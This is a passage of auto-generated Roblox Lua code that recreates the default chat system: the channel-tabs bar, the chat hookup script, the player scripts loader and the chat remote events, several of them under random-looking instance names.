		local moduleChannelsTab = require(modulesFolder:WaitForChild("ChannelsTab"))
		local MessageSender = require(modulesFolder:WaitForChild("MessageSender"))
		local ChatSettings = require(clientChatModules:WaitForChild("ChatSettings"))
		local CurveUtil = require(modulesFolder:WaitForChild("CurveUtil"))
		
		--////////////////////////////// Methods
		--//////////////////////////////////////
		local methods = {}
		methods.__index = methods
		
		function methods:CreateGuiObjects(targetParent)
			local BaseFrame = Instance.new("Frame")
			BaseFrame.Selectable = false
			BaseFrame.Size = UDim2.new(1, 0, 1, 0)
			BaseFrame.BackgroundTransparency = 1
			BaseFrame.Parent = targetParent
		
			local ScrollingBase = Instance.new("Frame")
			ScrollingBase.Selectable = false
			ScrollingBase.Name = "ScrollingBase"
			ScrollingBase.BackgroundTransparency = 1
			ScrollingBase.ClipsDescendants = true
			ScrollingBase.Size = UDim2.new(1, 0, 1, 0)
			ScrollingBase.Position = UDim2.new(0, 0, 0, 0)
			ScrollingBase.Parent = BaseFrame
		
			local ScrollerSizer = Instance.new("Frame")
			ScrollerSizer.Selectable = false
			ScrollerSizer.Name = "ScrollerSizer"
			ScrollerSizer.BackgroundTransparency = 1
			ScrollerSizer.Size = UDim2.new(1, 0, 1, 0)
			ScrollerSizer.Position = UDim2.new(0, 0, 0, 0)
			ScrollerSizer.Parent = ScrollingBase
		
			local ScrollerFrame = Instance.new("Frame")
			ScrollerFrame.Selectable = false
			ScrollerFrame.Name = "ScrollerFrame"
			ScrollerFrame.BackgroundTransparency = 1
			ScrollerFrame.Size = UDim2.new(1, 0, 1, 0)
			ScrollerFrame.Position = UDim2.new(0, 0, 0, 0)
			ScrollerFrame.Parent = ScrollerSizer
		
			local LeaveConfirmationFrameBase = Instance.new("Frame")
			LeaveConfirmationFrameBase.Selectable = false
			LeaveConfirmationFrameBase.Size = UDim2.new(1, 0, 1, 0)
			LeaveConfirmationFrameBase.Position = UDim2.new(0, 0, 0, 0)
			LeaveConfirmationFrameBase.ClipsDescendants = true
			LeaveConfirmationFrameBase.BackgroundTransparency = 1
			LeaveConfirmationFrameBase.Parent = BaseFrame
		
			local LeaveConfirmationFrame = Instance.new("Frame")
			LeaveConfirmationFrame.Selectable = false
			LeaveConfirmationFrame.Name = "LeaveConfirmationFrame"
			LeaveConfirmationFrame.Size = UDim2.new(1, 0, 1, 0)
			LeaveConfirmationFrame.Position = UDim2.new(0, 0, 1, 0)
			LeaveConfirmationFrame.BackgroundTransparency = 0.6
			LeaveConfirmationFrame.BorderSizePixel = 0
			LeaveConfirmationFrame.BackgroundColor3 = Color3.new(0, 0, 0)
			LeaveConfirmationFrame.Parent = LeaveConfirmationFrameBase
		
			local InputBlocker = Instance.new("TextButton")
			InputBlocker.Selectable = false
			InputBlocker.Size = UDim2.new(1, 0, 1, 0)
			InputBlocker.BackgroundTransparency = 1
			InputBlocker.Text = ""
			InputBlocker.Parent = LeaveConfirmationFrame
		
			local LeaveConfirmationButtonYes = Instance.new("TextButton")
			LeaveConfirmationButtonYes.Selectable = false
			LeaveConfirmationButtonYes.Size = UDim2.new(0.25, 0, 1, 0)
			LeaveConfirmationButtonYes.BackgroundTransparency = 1
			LeaveConfirmationButtonYes.Font = ChatSettings.DefaultFont
			LeaveConfirmationButtonYes.TextSize = 18
			LeaveConfirmationButtonYes.TextStrokeTransparency = 0.75
			LeaveConfirmationButtonYes.Position = UDim2.new(0, 0, 0, 0)
			LeaveConfirmationButtonYes.TextColor3 = Color3.new(0, 1, 0)
			LeaveConfirmationButtonYes.Text = "Confirm"
			LeaveConfirmationButtonYes.Parent = LeaveConfirmationFrame
		
			local LeaveConfirmationButtonNo = LeaveConfirmationButtonYes:Clone()
			LeaveConfirmationButtonNo.Parent = LeaveConfirmationFrame
			LeaveConfirmationButtonNo.Position = UDim2.new(0.75, 0, 0, 0)
			LeaveConfirmationButtonNo.TextColor3 = Color3.new(1, 0, 0)
			LeaveConfirmationButtonNo.Text = "Cancel"
		
			local LeaveConfirmationNotice = Instance.new("TextLabel")
			LeaveConfirmationNotice.Selectable = false
			LeaveConfirmationNotice.Size = UDim2.new(0.5, 0, 1, 0)
			LeaveConfirmationNotice.Position = UDim2.new(0.25, 0, 0, 0)
			LeaveConfirmationNotice.BackgroundTransparency = 1
			LeaveConfirmationNotice.TextColor3 = Color3.new(1, 1, 1)
			LeaveConfirmationNotice.TextStrokeTransparency = 0.75
			LeaveConfirmationNotice.Text = "Leave channel <XX>?"
			LeaveConfirmationNotice.Font = ChatSettings.DefaultFont
			LeaveConfirmationNotice.TextSize = 18
			LeaveConfirmationNotice.Parent = LeaveConfirmationFrame
		
			local LeaveTarget = Instance.new("StringValue")
			LeaveTarget.Name = "LeaveTarget"
			LeaveTarget.Parent = LeaveConfirmationFrame
		
			local outPos = LeaveConfirmationFrame.Position
			LeaveConfirmationButtonYes.MouseButton1Click:connect(function()
				MessageSender:SendMessage(string.format("/leave %s", LeaveTarget.Value), nil)
				LeaveConfirmationFrame:TweenPosition(outPos, Enum.EasingDirection.Out, Enum.EasingStyle.Quad, 0.2, true)
			end)
			LeaveConfirmationButtonNo.MouseButton1Click:connect(function()
				LeaveConfirmationFrame:TweenPosition(outPos, Enum.EasingDirection.Out, Enum.EasingStyle.Quad, 0.2, true)
			end)
		
		
		
			local scale = 0.7
			local scaleOther = (1 - scale) / 2
			local pageButtonImage = "rbxasset://textures/ui/Chat/TabArrowBackground.png"
			local pageButtonArrowImage = "rbxasset://textures/ui/Chat/TabArrow.png"
		
			--// ToDo: Remove these lines when the assets are put into trunk.
			--// These grab unchanging versions hosted on the site, and not from the content folder.
			pageButtonImage = "rbxassetid://471630199"
			pageButtonArrowImage = "rbxassetid://471630112"
		
		
			local PageLeftButton = Instance.new("ImageButton", BaseFrame)
			PageLeftButton.Selectable = ChatSettings.GamepadNavigationEnabled
			PageLeftButton.Name = "PageLeftButton"
			PageLeftButton.SizeConstraint = Enum.SizeConstraint.RelativeYY
			PageLeftButton.Size = UDim2.new(scale, 0, scale, 0)
			PageLeftButton.BackgroundTransparency = 1
			PageLeftButton.Position = UDim2.new(0, 4, scaleOther, 0)
			PageLeftButton.Visible = false
			PageLeftButton.Image = pageButtonImage
			local ArrowLabel = Instance.new("ImageLabel", PageLeftButton)
			ArrowLabel.Name = "ArrowLabel"
			ArrowLabel.BackgroundTransparency = 1
			ArrowLabel.Size = UDim2.new(0.4, 0, 0.4, 0)
			ArrowLabel.Image = pageButtonArrowImage
		
			local PageRightButtonPositionalHelper = Instance.new("Frame", BaseFrame)
			PageRightButtonPositionalHelper.Selectable = false
			PageRightButtonPositionalHelper.BackgroundTransparency = 1
			PageRightButtonPositionalHelper.Name = "PositionalHelper"
			PageRightButtonPositionalHelper.Size = PageLeftButton.Size
			PageRightButtonPositionalHelper.SizeConstraint = PageLeftButton.SizeConstraint
			PageRightButtonPositionalHelper.Position = UDim2.new(1, 0, scaleOther, 0)
		
			local PageRightButton = PageLeftButton:Clone()
			PageRightButton.Parent = PageRightButtonPositionalHelper
			PageRightButton.Name = "PageRightButton"
			PageRightButton.Size = UDim2.new(1, 0, 1, 0)
			PageRightButton.SizeConstraint = Enum.SizeConstraint.RelativeXY
			PageRightButton.Position = UDim2.new(-1, -4, 0, 0)
		
			local positionOffset = UDim2.new(0.05, 0, 0, 0)
		
			PageRightButton.ArrowLabel.Position = UDim2.new(0.3, 0, 0.3, 0) + positionOffset
			PageLeftButton.ArrowLabel.Position = UDim2.new(0.3, 0, 0.3, 0) - positionOffset
			PageLeftButton.ArrowLabel.Rotation = 180
		
		
			self.GuiObject = BaseFrame
		
			self.GuiObjects.BaseFrame = BaseFrame
			self.GuiObjects.ScrollerSizer = ScrollerSizer
			self.GuiObjects.ScrollerFrame = ScrollerFrame
			self.GuiObjects.PageLeftButton = PageLeftButton
			self.GuiObjects.PageRightButton = PageRightButton
			self.GuiObjects.LeaveConfirmationFrame = LeaveConfirmationFrame
			self.GuiObjects.LeaveConfirmationNotice = LeaveConfirmationNotice
		
			self.GuiObjects.PageLeftButtonArrow = PageLeftButton.ArrowLabel
			self.GuiObjects.PageRightButtonArrow = PageRightButton.ArrowLabel
			self:AnimGuiObjects()
		
			PageLeftButton.MouseButton1Click:connect(function() self:ScrollChannelsFrame(-1) end)
			PageRightButton.MouseButton1Click:connect(function() self:ScrollChannelsFrame(1) end)
		
			self:ScrollChannelsFrame(0)
		end
		
		
		function methods:UpdateMessagePostedInChannel(channelName)
			local tab = self:GetChannelTab(channelName)
			if (tab) then
				tab:UpdateMessagePostedInChannel()
			else
				warn("ChannelsTab '" .. channelName .. "' does not exist!")
			end
		end
		
		function methods:AddChannelTab(channelName)
			if (self:GetChannelTab(channelName)) then
				error("Channel tab '" .. channelName .. "'already exists!")
			end
		
			local tab = moduleChannelsTab.new(channelName)
			tab.GuiObject.Parent = self.GuiObjects.ScrollerFrame
			self.ChannelTabs[channelName:lower()] = tab
		
			self.NumTabs = self.NumTabs + 1
			self:OrganizeChannelTabs()
		
			if (ChatSettings.RightClickToLeaveChannelEnabled) then
				tab.NameTag.MouseButton2Click:connect(function()
					self.LeaveConfirmationNotice.Text = string.format("Leave channel %s?", tab.ChannelName)
					self.LeaveConfirmationFrame.LeaveTarget.Value = tab.ChannelName
					self.LeaveConfirmationFrame:TweenPosition(UDim2.new(0, 0, 0, 0), Enum.EasingDirection.In, Enum.EasingStyle.Quad, 0.2, true)
				end)
			end
		
			return tab
		end
		
		function methods:RemoveChannelTab(channelName)
			if (not self:GetChannelTab(channelName)) then
				error("Channel tab '" .. channelName .. "'does not exist!")
			end
		
			local indexName = channelName:lower()
			self.ChannelTabs[indexName]:Destroy()
			self.ChannelTabs[indexName] = nil
		
			self.NumTabs = self.NumTabs - 1
			self:OrganizeChannelTabs()
		end
		
		function methods:GetChannelTab(channelName)
			return self.ChannelTabs[channelName:lower()]
		end
		
		function methods:OrganizeChannelTabs()
			local order = {}
		
			table.insert(order, self:GetChannelTab(ChatSettings.GeneralChannelName))
			table.insert(order, self:GetChannelTab("System"))
		
			for tabIndexName, tab in pairs(self.ChannelTabs) do
				if (tab.ChannelName ~= ChatSettings.GeneralChannelName and tab.ChannelName ~= "System") then
					table.insert(order, tab)
				end
			end
		
			for index, tab in pairs(order) do
				tab.GuiObject.Position = UDim2.new(index - 1, 0, 0, 0)
			end
		
			--// Dynamic tab resizing
			self.GuiObjects.ScrollerSizer.Size = UDim2.new(1 / math.max(1, math.min(ChatSettings.ChannelsBarFullTabSize, self.NumTabs)), 0, 1, 0)
		
			self:ScrollChannelsFrame(0)
		end
		
		function methods:ResizeChannelTabText(textSize)
			for i, tab in pairs(self.ChannelTabs) do
				tab:SetTextSize(textSize)
			end
		end
		
		function methods:ScrollChannelsFrame(dir)
			if (self.ScrollChannelsFrameLock) then return end
			self.ScrollChannelsFrameLock = true
		
			local tabNumber = ChatSettings.ChannelsBarFullTabSize
		
			local newPageNum = self.CurPageNum + dir
			if (newPageNum < 0) then
				newPageNum = 0
			elseif (newPageNum > 0 and newPageNum + tabNumber > self.NumTabs) then
				newPageNum = self.NumTabs - tabNumber
			end
		
			self.CurPageNum = newPageNum
		
			local tweenTime = 0.15
			local endPos = UDim2.new(-self.CurPageNum, 0, 0, 0)
		
			self.GuiObjects.PageLeftButton.Visible = (self.CurPageNum > 0)
			self.GuiObjects.PageRightButton.Visible = (self.CurPageNum + tabNumber < self.NumTabs)
		
			if dir == 0 then
				self.ScrollChannelsFrameLock = false
				return
			end
		
			local function UnlockFunc()
				self.ScrollChannelsFrameLock = false
			end
		
			self:WaitUntilParentedCorrectly()
		
			self.GuiObjects.ScrollerFrame:TweenPosition(endPos, Enum.EasingDirection.InOut, Enum.EasingStyle.Quad, tweenTime, true, UnlockFunc)
		end
		
		function methods:FadeOutBackground(duration)
			for channelName, channelObj in pairs(self.ChannelTabs) do
				channelObj:FadeOutBackground(duration)
			end
		
			self.AnimParams.Background_TargetTransparency = 1
			self.AnimParams.Background_NormalizedExptValue = CurveUtil:NormalizedDefaultExptValueInSeconds(duration)
		end
		
		function methods:FadeInBackground(duration)
			for channelName, channelObj in pairs(self.ChannelTabs) do
				channelObj:FadeInBackground(duration)
			end
		
			self.AnimParams.Background_TargetTransparency = 0.6
			self.AnimParams.Background_NormalizedExptValue = CurveUtil:NormalizedDefaultExptValueInSeconds(duration)
		end
		
		function methods:FadeOutText(duration)
			for channelName, channelObj in pairs(self.ChannelTabs) do
				channelObj:FadeOutText(duration)
			end
		end
		
		function methods:FadeInText(duration)
			for channelName, channelObj in pairs(self.ChannelTabs) do
				channelObj:FadeInText(duration)
			end
		end
		
		function methods:AnimGuiObjects()
			self.GuiObjects.PageLeftButton.ImageTransparency = self.AnimParams.Background_CurrentTransparency
			self.GuiObjects.PageRightButton.ImageTransparency = self.AnimParams.Background_CurrentTransparency
			self.GuiObjects.PageLeftButtonArrow.ImageTransparency = self.AnimParams.Background_CurrentTransparency
			self.GuiObjects.PageRightButtonArrow.ImageTransparency = self.AnimParams.Background_CurrentTransparency
		end
		
		function methods:InitializeAnimParams()
			self.AnimParams.Background_TargetTransparency = 0.6
			self.AnimParams.Background_CurrentTransparency = 0.6
			self.AnimParams.Background_NormalizedExptValue = CurveUtil:NormalizedDefaultExptValueInSeconds(0)
		end
		
		function methods:Update(dtScale)
			for channelName, channelObj in pairs(self.ChannelTabs) do
				channelObj:Update(dtScale)
			end
		
			self.AnimParams.Background_CurrentTransparency = CurveUtil:Expt(
					self.AnimParams.Background_CurrentTransparency,
					self.AnimParams.Background_TargetTransparency,
					self.AnimParams.Background_NormalizedExptValue,
					dtScale
			)
		
			self:AnimGuiObjects()
		end
		
		--// ToDo: Move to common modules
		function methods:WaitUntilParentedCorrectly()
			while (not self.GuiObject:IsDescendantOf(game:GetService("Players").LocalPlayer)) do
				self.GuiObject.AncestryChanged:wait()
			end
		end
		
		--///////////////////////// Constructors
		--//////////////////////////////////////
		
		function module.new()
			local obj = setmetatable({}, methods)
		
			obj.GuiObject = nil
			obj.GuiObjects = {}
		
			obj.ChannelTabs = {}
			obj.NumTabs = 0
			obj.CurPageNum = 0
		
			obj.ScrollChannelsFrameLock = false
		
			obj.AnimParams = {}
		
			obj:InitializeAnimParams()
		
			ChatSettings.SettingsChanged:connect(function(setting, value)
				if (setting == "ChatChannelsTabTextSize") then
					obj:ResizeChannelTabText(value)
				end
			end)
		
			return obj
		end
		
		return module
		
	end
}

--// Scripts

-- tcrgwfwefc
task.spawn(function()
	local script = tcrgwfwefc
	script.Disabled = true

	script:GetPropertyChangedSignal("Disabled"):Wait()

	local oldreq = require
	local function require(target)
		if modules[target] then
			return modules[target]()
		end
		return oldreq(target)
	end

	--	// FileName: ChatScript.lua
	--	// Written by: Xsitsu
	--	// Description: Hooks main chat module up to Topbar in corescripts.
	
	local FFlagUserHandleChatHotKeyWithContextActionService = false do
		local ok, value = pcall(function()
			return UserSettings():IsUserFeatureEnabled("UserHandleChatHotKeyWithContextActionService")
		end)
		if ok then
			FFlagUserHandleChatHotKeyWithContextActionService = value
		end
	end
	
	local StarterGui = game:GetService("StarterGui")
	local GuiService = game:GetService("GuiService")
	local ChatService = game:GetService("Chat")
	local ReplicatedStorage = game:GetService("ReplicatedStorage")
	
	local MAX_COREGUI_CONNECTION_ATTEMPTS = 10
	
	local ClientChatModules = ChatService:WaitForChild("ClientChatModules")
	local ChatSettings = require(ClientChatModules:WaitForChild("ChatSettings"))
	
	local function DoEverything()
		local Chat = require(script:WaitForChild("ChatMain"))
	
		local containerTable = {}
		containerTable.ChatWindow = {}
		containerTable.SetCore = {}
		containerTable.GetCore = {}
	
		containerTable.ChatWindow.ChatTypes = {}
		containerTable.ChatWindow.ChatTypes.BubbleChatEnabled = ChatSettings.BubbleChatEnabled
		containerTable.ChatWindow.ChatTypes.ClassicChatEnabled = ChatSettings.ClassicChatEnabled
	
		--// Connection functions
		local function ConnectEvent(name)
			local event = Instance.new("BindableEvent")
			event.Name = name
			containerTable.ChatWindow[name] = event
	
			event.Event:connect(function(...) Chat[name](Chat, ...) end)
		end
	
		local function ConnectFunction(name)
			local func = Instance.new("BindableFunction")
			func.Name = name
			containerTable.ChatWindow[name] = func
	
			func.OnInvoke = function(...) return Chat[name](Chat, ...) end
		end
	
		local function ReverseConnectEvent(name)
			local event = Instance.new("BindableEvent")
			event.Name = name
			containerTable.ChatWindow[name] = event
	
			Chat[name]:connect(function(...) event:Fire(...) end)
		end
	
		local function ConnectSignal(name)
			local event = Instance.new("BindableEvent")
			event.Name = name
			containerTable.ChatWindow[name] = event
	
			event.Event:connect(function(...) Chat[name]:fire(...) end)
		end
	
		local function ConnectSetCore(name)
			local event = Instance.new("BindableEvent")
			event.Name = name
			containerTable.SetCore[name] = event
	
			event.Event:connect(function(...) Chat[name.."Event"]:fire(...) end)
		end
	
		local function ConnectGetCore(name)
			local func = Instance.new("BindableFunction")
			func.Name = name
			containerTable.GetCore[name] = func
	
			func.OnInvoke = function(...) return Chat["f"..name](...) end
		end
	
		--// Do connections
		ConnectEvent("ToggleVisibility")
		ConnectEvent("SetVisible")
		ConnectEvent("FocusChatBar")
		ConnectEvent("EnterWhisperState")
		ConnectFunction("GetVisibility")
		ConnectFunction("GetMessageCount")
		ConnectEvent("TopbarEnabledChanged")
		ConnectFunction("IsFocused")
	
		ReverseConnectEvent("ChatBarFocusChanged")
		ReverseConnectEvent("VisibilityStateChanged")
		ReverseConnectEvent("MessagesChanged")
		ReverseConnectEvent("MessagePosted")
	
		ConnectSignal("CoreGuiEnabled")
	
		ConnectSetCore("ChatMakeSystemMessage")
		ConnectSetCore("ChatWindowPosition")
		ConnectSetCore("ChatWindowSize")
		ConnectGetCore("ChatWindowPosition")
		ConnectGetCore("ChatWindowSize")
		ConnectSetCore("ChatBarDisabled")
		ConnectGetCore("ChatBarDisabled")
	
	    if not FFlagUserHandleChatHotKeyWithContextActionService then    
	        ConnectEvent("SpecialKeyPressed")
	    end
	
		SetCoreGuiChatConnections(containerTable)
	end
	
	function SetCoreGuiChatConnections(containerTable)
		local tries = 0
		while tries < MAX_COREGUI_CONNECTION_ATTEMPTS do
			tries = tries + 1
			local success, ret = pcall(function() StarterGui:SetCore("CoreGuiChatConnections", containerTable) end)
			if success then
				break
			end
			if not success and tries == MAX_COREGUI_CONNECTION_ATTEMPTS then
				error("Error calling SetCore CoreGuiChatConnections: " .. ret)
			end
			wait()
		end
	end
	
	function checkBothChatTypesDisabled()
		if ChatSettings.BubbleChatEnabled ~= nil then
			if ChatSettings.ClassicChatEnabled ~= nil then
				return not (ChatSettings.BubbleChatEnabled or ChatSettings.ClassicChatEnabled)
			end
		end
		return false
	end
	
	if (not GuiService:IsTenFootInterface()) and (not game:GetService('UserInputService').VREnabled) then
		if not checkBothChatTypesDisabled() then
			DoEverything()
		else
			local containerTable = {}
			containerTable.ChatWindow = {}
	
			containerTable.ChatWindow.ChatTypes = {}
			containerTable.ChatWindow.ChatTypes.BubbleChatEnabled = false
			containerTable.ChatWindow.ChatTypes.ClassicChatEnabled = false
			SetCoreGuiChatConnections(containerTable)
		end
	else
		-- Make init data request to register as a speaker
		local EventFolder = ReplicatedStorage:WaitForChild("DefaultChatSystemChatEvents")
		EventFolder.GetInitDataRequest:InvokeServer()
	end
	
end)

--[[
	Roblox2Lua
	----------
	
	This code was generated using
	Deluct's Roblox2Lua plugin.
]]--

--// Instances

local tetrfewrwq = Instance.new("LocalizationTable")
tetrfewrwq.Name = "tetrfewrwq"
tetrfewrwq.Parent = workspace

--[[
	Roblox2Lua
	----------
	
	This code was generated using
	Deluct's Roblox2Lua plugin.
]]--

local trcger = Instance.new("LocalScript")
trcger.Disabled = true
trcger.Name = "trcger"
trcger.Parent = workspace

--//Modules

local modules = {}

--// Scripts

-- trcger
task.spawn(function()
	local script = trcger
	script.Disabled = true

	script:GetPropertyChangedSignal("Disabled"):Wait()

	local oldreq = require
	local function require(target)
		if modules[target] then
			return modules[target]()
		end
		return oldreq(target)
	end

	--[[
		PlayerScriptsLoader - This script requires and instantiates the PlayerModule singleton
	
		2018 PlayerScripts Update - AllYourBlox
	--]]
	
	require(script.Parent:WaitForChild("PlayerModule"))
end)

--[[
	Roblox2Lua
	----------
	
	This code was generated using
	Deluct's Roblox2Lua plugin.
]]--

--// Instances

local tretcfwfrrqewffrwqc = Instance.new("Folder")
tretcfwfrrqewffrwqc.Name = "tretcfwfrrqewFfrwqc"
tretcfwfrrqewffrwqc.Parent = workspace

local un_mute_player_request = Instance.new("RemoteFunction")
un_mute_player_request.Name = "UnMutePlayerRequest"
un_mute_player_request.Parent = tretcfwfrrqewffrwqc

local mute_player_request = Instance.new("RemoteFunction")
mute_player_request.Name = "MutePlayerRequest"
mute_player_request.Parent = tretcfwfrrqewffrwqc

local get_init_data_request = Instance.new("RemoteFunction")
get_init_data_request.Name = "GetInitDataRequest"
get_init_data_request.Parent = tretcfwfrrqewffrwqc

local set_blocked_user_ids_request = Instance.new("RemoteEvent")
set_blocked_user_ids_request.Name = "SetBlockedUserIdsRequest"
set_blocked_user_ids_request.Parent = tretcfwfrrqewffrwqc

local say_message_request = Instance.new("RemoteEvent")
say_message_request.Name = "SayMessageRequest"
say_message_request.Parent = tretcfwfrrqewffrwqc

local channel_namecolor_updated = Instance.new("RemoteEvent")
channel_namecolor_updated.Name = "ChannelNameColorUpdated"
channel_namecolor_updated.Parent = tretcfwfrrqewffrwqc

local on_main_channel_set = Instance.new("RemoteEvent")
on_main_channel_set.Name = "OnMainChannelSet"
on_main_channel_set.Parent = tretcfwfrrqewffrwqc

local on_unmuted = Instance.new("RemoteEvent")
on_unmuted.Name = "OnUnmuted"
on_unmuted.Parent = tretcfwfrrqewffrwqc

local on_muted = Instance.new("RemoteEvent")
on_muted.Name = "OnMuted"
on_muted.Parent = tretcfwfrrqewffrwqc

local on_channel_left = Instance.new("RemoteEvent")
on_channel_left.Name = "OnChannelLeft"
on_channel_left.Parent = tretcfwfrrqewffrwqc

local on_channel_joined = Instance.new("RemoteEvent")
on_channel_joined.Name = "OnChannelJoined"
on_channel_joined.Parent = tretcfwfrrqewffrwqc

local on_new_system_message = Instance.new("RemoteEvent")
on_new_system_message.Name = "OnNewSystemMessage"
on_new_system_message.Parent = tretcfwfrrqewffrwqc

local on_message_done_filtering = Instance.new("RemoteEvent")
on_message_done_filtering.Name = "OnMessageDoneFiltering"
on_message_done_filtering.Parent = tretcfwfrrqewffrwqc

local on_new_message = Instance.new("RemoteEvent")
on_new_message.Name = "OnNewMessage"
on_new_message.Parent = tretcfwfrrqewffrwqc